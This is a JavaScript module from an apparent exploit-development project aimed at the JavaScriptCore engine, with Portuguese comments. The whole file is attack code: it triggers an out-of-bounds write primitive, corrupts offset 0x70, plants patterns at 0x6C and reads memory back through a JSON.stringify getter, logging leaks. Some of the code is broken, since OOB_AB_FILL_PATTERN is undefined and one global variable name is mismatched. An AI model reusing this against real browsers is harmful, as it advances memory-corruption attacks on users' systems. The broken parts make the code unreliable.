// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterFor0x6CExploit";
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null,
    results_at_0x6C: [] // Armazenará {pattern_planted_low, value_after_stringify_qword_hex}
};

const CORRUPTION_OFFSET_TRIGGER = 0x70; 
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const TARGET_WRITE_OFFSET_0x6C = 0x6C; 

// Padrões para plantar nos 4 bytes baixos de 0x6C
const LOW_DWORD_PATTERNS_TO_PLANT = [
    0xFEFEFEFE, 
    0xCDCDCDCD, 
    0x12345678, 
    0x00000000,
    0xABABABAB,
    JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 2 // ID de Estrutura de AB
];

// Constante que estava faltando, defina um tamanho para sondagem
const OOB_AB_SNOOP_WINDOW_SIZE = 0x100; // Ex: Sondar primeiros 256 bytes

let global_object_for_stress_in_getter;

class CheckpointFor0x6CExploit {
    constructor(id) {
        this.id_marker = `Exploit0x6CChkpt-${id}`;
        this.prop_for_stringify_target = null; // Será o objeto de stress
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "Exploit0x6C_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        // current_test_results será preenchido pelo runner para cada sub-teste.
        // Este getter apenas lê o valor final em 0x6C e o loga.
        let details_log_g = [];
        let value_read_at_0x6C_hex = "ERRO_LEITURA";
        
        try {
            if (!oob_array_buffer_real || !oob_read_absolute) {
                throw new Error("oob_ab ou oob_read_absolute não disponíveis.");
            }
            
            // O JSON.stringify externo (que acionou este getter) já fez o Stringifier escrever em 0x6C.
            // Apenas lemos o resultado.
            const value_at_0x6C_qword = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8);
            value_read_at_0x6C_hex = value_at_0x6C_qword.toString(true);
            details_log_g.push(`Valor lido de oob_data[${toHex(TARGET_WRITE_OFFSET_0x6C)}] (QWORD): ${value_read_at_0x6C_hex}`);
            logS3(details_log_g[details_log_g.length-1], "leak", FNAME_GETTER);

            // A análise se o valor é "bom" será feita no runner que conhece o padrão plantado.
            // Adicionar ao current_test_results que é específico para este sub-teste.
            if (current_test_results && current_test_results.writes_at_0x6C) {
                 // Esta estrutura é para o overall_summary, o current_test_results do sub-teste já tem o valor
            } else if (current_test_results) {
                current_test_results.message = (current_test_results.message || "") + ` Lido de 0x6C: ${value_read_at_0x6C_hex}.`;
            }


        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            if(current_test_results) { // Verifica se current_test_results está definido
                current_test_results.error = String(e_getter_main);
                current_test_results.message = (current_test_results.message || "") + ` Erro no getter: ${e_getter_main.message}`;
            }
        }
        // Atualizar o objeto de resultados do sub-teste atual que está no escopo do runner
        if (typeof current_test_results_for_subtest !== 'undefined' && current_test_results_for_subtest) {
            current_test_results_for_subtest.value_after_stringify_qword_hex = value_read_at_0x6C_hex;
            current_test_results_for_subtest.details_getter = details_log_g.join('; ');
        }

        return { "getter_0x6C_analysis_v3_done": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointFor0x6CExploit.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { 
            id: this.id_marker, 
            processed_target: this.prop_for_stringify_target, // Faz o Stringifier processar o target
            processed_by_0x6c_exploit_test: true 
        };
    }
}

// Variável para passar o resultado do getter para o runner do sub-teste
let current_test_results_for_subtest; 

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "execute0x6CExploitAnalysisRunner";
    logS3(`--- Iniciando Teste de Exploração da Escrita em 0x6C ---`, "test", FNAME_TEST_RUNNER);

    let overall_summary_for_0x6c_exploit_test = [];

    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) { 
        logS3("Offsets Críticos Ausentes", "critical", FNAME_TEST_RUNNER); return;
    }

    for (const initial_low_dword_to_plant of LOW_DWORD_PATTERNS_TO_PLANT) {
        getter_called_flag = false; 
        // Este current_test_results_for_subtest será modificado pelo getter e depois adicionado ao overall_summary
        current_test_results_for_subtest = { 
            success: false, 
            message: `Testando com padrão baixo ${toHex(initial_low_dword_to_plant)} em ${toHex(TARGET_WRITE_OFFSET_0x6C)}.`, 
            error: null, 
            pattern_planted_low_hex: toHex(initial_low_dword_to_plant),
            value_after_stringify_qword_hex: null, // Será preenchido pelo getter
            details_getter: ""
        };

        logS3(`INICIANDO SUB-TESTE: Padrão baixo em ${toHex(TARGET_WRITE_OFFSET_0x6C)} será ${toHex(initial_low_dword_to_plant)}`, "subtest", FNAME_TEST_RUNNER);

        try {
            await triggerOOB_primitive();
            if (!oob_array_buffer_real || !oob_dataview_real || !oob_write_absolute) { throw new Error("OOB Init falhou"); }
            logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
            
            // 1. Preencher a área de sondagem com um padrão geral, EXCETO 0x6C e 0x70
            const fill_limit = Math.min(OOB_AB_SNOOP_WINDOW_SIZE, oob_array_buffer_real.byteLength);
            for (let offset = 0; offset < fill_limit; offset += 4) {
                if ((offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) ||
                    (offset >= TARGET_WRITE_OFFSET_0x6C && offset < TARGET_WRITE_OFFSET_0x6C + 8) ) { // Deixar 0x6C e 0x70 para escritas específicas
                    continue; 
                }
                try { oob_write_absolute(offset, OOB_AB_FILL_PATTERN, 4); } catch(e){}
            }
            // Escrever o padrão de teste específico nos 4 bytes baixos de 0x6C (em TARGET_WRITE_OFFSET_0x6C)
            // E zerar os 4 bytes altos de 0x6C (em TARGET_WRITE_OFFSET_0x6C + 4)
            oob_write_absolute(TARGET_WRITE_OFFSET_0x6C, initial_low_dword_to_plant, 4);
            oob_write_absolute(TARGET_WRITE_OFFSET_0x6C + 4, 0x00000000, 4); // Zerar parte alta
            logS3(`oob_ab preenchido. oob_data[${toHex(TARGET_WRITE_OFFSET_0x6C)}] (QWORD inicial) = ${toHex(0,32)}_${toHex(initial_low_dword_to_plant,32)}.`, "info", FNAME_TEST_RUNNER);
            
            // 2. Objeto alvo global para o stress_obj no getter
            global_object_for_stress_payload = { "unique_id": 0xFEEDBEEF + initial_low_dword_to_plant };

            // 3. Escrita OOB Gatilho em 0x70
            oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
            logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

            const checkpoint_obj = new CheckpointFor0x6CExploit(1);
            checkpoint_obj.prop_for_stringify_target = global_object_for_stress_payload;
            logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
            
            JSON.stringify(checkpoint_obj); // Aciona o getter

            // Análise do resultado do sub-teste (após o getter ter modificado current_test_results_for_subtest)
            if (getter_called_flag && current_test_results_for_subtest.value_after_stringify_qword_hex) {
                const final_qword_val = new AdvancedInt64(current_test_results_for_subtest.value_after_stringify_qword_hex);
                if (final_qword_val.high() === 0xFFFFFFFF && final_qword_val.low() === initial_low_dword_to_plant) {
                    current_test_results_for_subtest.success = true; // Sucesso: Alto FFFF, Baixo preservado
                    current_test_results_for_subtest.message = `SUCESSO! 0x6C: Alto=${toHex(final_qword_val.high())}, Baixo=${toHex(final_qword_val.low())} (preservado).`;
                } else if (final_qword_val.high() === 0xFFFFFFFF) {
                    current_test_results_for_subtest.success = true; // Sucesso parcial: Alto FFFF, mas Baixo mudou
                    current_test_results_for_subtest.message = `ANOMALIA! 0x6C: Alto=${toHex(final_qword_val.high())}, Baixo=${toHex(final_qword_val.low())} (alterado de ${toHex(initial_low_dword_to_plant)}).`;
                } else {
                    current_test_results_for_subtest.message = `Valor em 0x6C (${final_qword_val.toString(true)}) não teve Alto FFFFFFFF.`;
                }
            } else if (getter_called_flag) {
                 current_test_results_for_subtest.message = current_test_results_for_subtest.message || "Getter chamado, mas valor de 0x6C não registrado.";
            }


        } catch (mainError_runner_subtest) { 
            current_test_results_for_subtest.message = `Erro CRÍTICO no sub-teste: ${mainError_runner_subtest.message}`;
            current_test_results_for_subtest.error = String(mainError_runner_subtest);
            logS3(current_test_results_for_subtest.message, "critical", FNAME_TEST_RUNNER);
        } finally {
            logS3(`FIM DO SUB-TESTE com padrão inicial ${toHex(initial_low_dword_to_plant)} em ${toHex(TARGET_WRITE_OFFSET_0x6C)}`, "subtest", FNAME_TEST_RUNNER);
            if (getter_called_flag) {
                logS3(`  Resultado Sub-Teste: Success=${current_test_results_for_subtest.success}, Msg=${current_test_results_for_subtest.message}`, current_test_results_for_subtest.success ? "vuln" : "warn", FNAME_TEST_RUNNER);
                if(current_test_results_for_subtest.value_after_stringify_qword_hex) {
                     logS3(`    Valor final em ${toHex(TARGET_WRITE_OFFSET_0x6C)}: ${current_test_results_for_subtest.value_after_stringify_qword_hex}`, "leak", FNAME_TEST_RUNNER);
                }
            } else {
                logS3(`  Resultado Sub-Teste: GETTER NÃO FOI CHAMADO. Msg: ${current_test_results_for_subtest.message}`, "error", FNAME_TEST_RUNNER);
            }
            overall_summary_for_0x6c_exploit_test.push(JSON.parse(JSON.stringify(current_test_results_for_subtest))); // Deep copy
            clearOOBEnvironment();
            global_object_for_stress_payload = null;
            if (initial_low_dword_to_plant !== LOW_DWORD_PATTERNS_TO_PLANT[LOW_DWORD_PATTERNS_TO_PLANT.length -1]) {
                 await PAUSE_S3(100); 
            }
        }
    }

    // Log do Sumário Geral
    logS3("==== SUMÁRIO GERAL DO TESTE DE ANÁLISE DA ESCRITA EM 0x6C (v3) ====", "test", FNAME_TEST_RUNNER);
    overall_summary_for_0x6c_exploit_test.forEach(res_item => {
        logS3(`Padrão Plantado (Low DWORD em ${toHex(TARGET_WRITE_OFFSET_0x6C)}): ${res_item.pattern_planted_low_hex}`, "info", FNAME_TEST_RUNNER);
        logS3(`  Getter Chamado: ${res_item.message.startsWith("Getter chamado") || res_item.success || res_item.error !== null}`, "info", FNAME_TEST_RUNNER);
        logS3(`  Sucesso (Anomalia Útil em 0x6C): ${res_item.success}`, res_item.success ? "vuln" : "info", FNAME_TEST_RUNNER);
        logS3(`  Mensagem: ${res_item.message}`, "info", FNAME_TEST_RUNNER);
        if(res_item.value_after_stringify_qword_hex){
            logS3(`    Valor Final Lido de ${toHex(TARGET_WRITE_OFFSET_0x6C)}: ${res_item.value_after_stringify_qword_hex}`, "leak", FNAME_TEST_RUNNER);
        }
        if (res_item.details_getter) logS3(`    Detalhes Getter: ${res_item.details_getter}`, "info", FNAME_TEST_RUNNER);
        if (res_item.error) logS3(`  Erro: ${res_item.error}`, "error", FNAME_TEST_RUNNER);
        logS3("----------------------------------------------------", "info", FNAME_TEST_RUNNER);
    });

    logS3(`--- Teste de Análise da Escrita em 0x6C (v3) Concluído ---`, "test", FNAME_TEST_RUNNER);
}
